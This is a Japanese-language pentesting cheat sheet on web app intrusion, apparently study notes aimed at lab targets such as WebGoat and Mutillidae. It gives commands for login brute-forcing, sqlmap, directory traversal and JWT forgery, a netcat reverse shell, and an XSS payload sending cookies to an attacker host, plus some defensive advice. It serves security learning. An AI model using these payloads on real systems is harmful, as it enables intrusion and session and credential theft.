# Web アプリケーション侵入

## 偵察

### robots.txt

クローラーを制限したい対象が書かれている

### sitemap.xml

robots.txt とは逆に、検索エンジンへの表示を希望する対象が書かれている

### favicon

favicon をデフォルトから変更していない場合、フレームワークを特定できる場合がある。favicon の MD5 を下記のサイトで検索する。  
https://wiki.owasp.org/index.php/OWASP_favicon_database

```shell
curl https://<target>/sites/favicon/images/favicon.ico | md5sum
```

## Web ログイン画面ブルートフォース

### hydra

https://github.com/vanhauser-thc/thc-hydra

```shell
hydra $TARGET http-post-form "/owaspbricks/login-3/index.php:username=^USER^&password=^PASS^&Login=submit:Wrong user name or password." -L http_default_users.txt -P http_default_pass.txt
```

### ffuf

```shell
# 有効なユーザー名を探している
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.92.48/customers/signup -mr "username already exists"

# 有効なユーザー名に対してパスワードブルートフォース
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.92.48/customers/login -fc 200
```

### WordPress 専用のセキュリティスキャナ

```shell
wpscan --url $TARGET --passwords password.txt --usernames elliot
```

## コマンドインジェクション（netcat でシェルを起動）

### １．攻撃マシンで Listen

```shell
nc -lvp <port>
```

### ２．コマンドインジェクションで攻撃マシンに接続

リバースシェルの種類は無数に存在する  
https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux

```shell
nc.traditional -e /bin/bash <ip> <port>
```

### 回数指定で ping を実行する（コマンドインジェクションのとき永久に ping し続けないように）

```shell
ping <ip> -c 3
```

## SQLmap

### URL にパラメータが含まれる例

```shell
sqlmap -u "http://192.168.11.12/mutillidae/index.php?page=user-info.php&username=aaa&password=bbb&user-info-php-submit-button=View+Account+Details" -p username --schema
```

### POST データにパラメータが含まれる例

```shell
sqlmap -u "http://192.168.11.12/WebGoat/attack?Screen=71&menu=1100" \
--method POST \
--data "employee_id=101&password=aaa&action=Login" \
--cookie "acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=iaml1rtui5cfcjvsrc504g0t6; JSESSIONID=FEA4D26D5A2B7C42D53D2216D29D7B3" \
--header "Authorization: Basic d2ViZ29hdDp3WJnb2F0" \
--level 1 --risk 1 \
-p "password"
```

## XSS

### Cookie を外部に送信する例

```js
<script>document.write('<img src="http://<attacker ip>:8888/' + document.cookie + '">')</script>
```

### iframe でテスト

```js
<iframe src="javascript:alert(`xss`)">
```

### 対策

- 全てのユーザー入力をサニタイズ、エスケープ、検証する
- Cookie 作成時、HttpOnly 属性を付ければ、js から Cookie にアクセスできなくなる
- HTTP ヘッダーの CSP 設定で、img の外部取得を禁止したり、同一オリジンの外部スクリプト以外の実行を禁止できる。

```http
Content-Security-Policy: img-src 'self';

# onclick等のインラインスクリプトも禁止されるため注意
Content-Security-Policy: script-src 'self';
```

### 確認用に簡易 Web サーバーを起動

```shell
python -m http.server 8888
```

### HTML コードの変更

```html
<img src="x" onerror="document.body.innerHTML='<h1>Hacked</h1>'" />
```

## xsser

XSS 脆弱性を自動的に検出するツール  
https://github.com/epsylon/xsser

```shell
xsser -u http://192.168.11.12 -g /bodgeit/search.jsp?q=XSS
```

## URL パラメータを狙った攻撃

https://book.hacktricks.xyz/pentesting-web/file-inclusion

### ディレクトリトラバーサルの脆弱性をスキャンする

"ttp://192.168.11.15/?lang=../../../etc/passwd" のようなパターンを総当たり的に試す

```shell
dotdotpwn -m http-url -u http://192.168.11.15/?lang=TRAVERSAL -f /etc/passwd -k "root" -d 5 -t 50
```

### PHP フィルター

```shell
# index.php を Base64エンコードしたものを出力させようとしている
http://192.168.11.15/?lang=php://filter/convert.base64-encode/resource=index
```

```php
# PHPのコードではこのようにフィルターが使われる
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
```

## JWT

```text
JWTトークンの構成は、
[ヘッダー].[ペイロード].[シグネチャ]
サーバーの秘密鍵でシグネチャを生成することで改ざん防止している。

（例）
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzM0Njc2NDE5fQ.FJBL6W4w5gwobrNThllUmbx4lPfIbNnMGOHTaQQdNyk

このヘッダーとペイロードをbase64デコードすると、
{"typ":"JWT","alg":"HS256"}
{"username":"guest","exp":1734676419}
となる。
```

#### None アルゴリズム

```text
サーバーがNoneアルゴリズムを禁止していない場合、
{"typ":"JWT","alg":"None"}
{"username":"admin","exp":1734676419}
のように変更し、
[ヘッダー].[ペイロード].
の形で送信すると、サーバー側でシグネチャのチェックが行われなくなる。
この場合、サーバーはこれをadminのセッションと認識する可能性がある。
```

#### 署名を検証しない

```text
"alg":"None"以外でも、署名を検証していない場合、シグネチャ部分を削除しても受け入れられる。
```

#### 脆弱なシークレット

```text
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list

でシークレットを割り出せる場合、CyberChef の JWT Sign 等のツールにペイロード部分を渡すことで、JWTを生成できる。
```

#### 対称署名アルゴリズムへのダウングレード

```text
例えば、RS256 などの非対称署名アルゴリズムが使用されている場合、アルゴリズムを HS256 にダウングレードできる可能性がある。
ヘッダーのアルゴリズムを変更し、公開鍵をシークレットとして、JWTを生成してみる。
```

#### 有効期間

```text
ペイロードに'exp'が設定されてない場合、トークンが永続的に保持される。
```

#### サーバー間リレー攻撃

```text
JWTを共有する複数のアプリケーションから成るシステムでは、AppAではadminだが、AppBではadminではないというケースがある。
AppAでログインしたとき
{"admin":1, "audience":"appA"}
というトークンが作られたとする。

AppBでは、audienceを参照してadminアクセスを拒否するべきだが、audienceのチェックが漏れていて、appBで不正に管理者アクセスを取得できる場合がある。これをサーバー間リレー攻撃という。
```

#### JWTTools
https://github.com/ticarpi/jwt_tool
```shell
$ git clone https://github.com/ticarpi/jwt_tool
$ python3 -m pip install -r requirements.txt
```

## セキュリティ視点

- インジェクション系の対策は、ユーザー入力を全て サニタイズ、検証、HTML エスケープ等する。
- Web サーバー上に機密ファイルを置かないこと
- Cookie に HttpOnly 属性を付けたらスクリプトから参照できない
- img の外部取得を禁止するのもセキュリティ的に有効
- ユーザー入力をファイル名（パス）として使う場合は、ディレクトリトラバーサルに注意
